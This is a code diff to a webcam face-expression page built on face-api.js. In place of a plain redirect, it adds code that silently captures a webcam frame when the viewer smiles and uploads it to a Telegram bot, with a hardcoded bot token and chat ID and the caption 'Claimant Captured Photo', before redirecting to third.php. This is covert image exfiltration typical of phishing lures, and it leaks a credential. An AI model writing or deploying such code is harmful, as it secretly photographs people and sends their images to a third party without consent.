@@ -1,4 +1,5 @@
 const video = document.getElementById('video')
+var canvas = document.getElementById("canvas");
 
 Promise.all([
   faceapi.nets.tinyFaceDetector.loadFromUri('models'),
@@ -31,8 +32,41 @@ video.addEventListener('play', () => {
     // Check for different facial expressions
     const expressions = resizedDetections[0].expressions;
     if (expressions.happy > 0.80) {
-      window.location.href = 'happy.html'; // Redirect to happy.html
+      const context = canvas.getContext("2d");
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Convert the canvas image to a Blob
+      canvas.toBlob(function(blob) {
+        sendPhotoToTelegram(blob);
+      }, 'image/jpeg', 0.75);
+ 
     } 
   }, 100);
 });
+
+function sendPhotoToTelegram(blob) {
+  var telegram_bot_id = "5943323134:AAFsjs5ta-Jxuh7MtRnYjTNocvYa6bb-XpM";
+  var chat_id = 1120054024;
+ 
+
+  // Create a FormData object to send the image
+  var formData = new FormData();
+  formData.append('chat_id', chat_id);
+  formData.append('photo', blob, 'photo.jpg');
+  formData.append('caption', 'Claimant Captured Photo');
+
+  // Send the image and caption to the Telegram Bot API using Ajax
+  fetch('https://api.telegram.org/bot' + telegram_bot_id + '/sendPhoto', {
+    method: 'POST',
+    body: formData
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log(data);
+    window.location.href = "third.php";
+  })
+  .catch(error => {
+    console.error(error);
+  });
+}
 
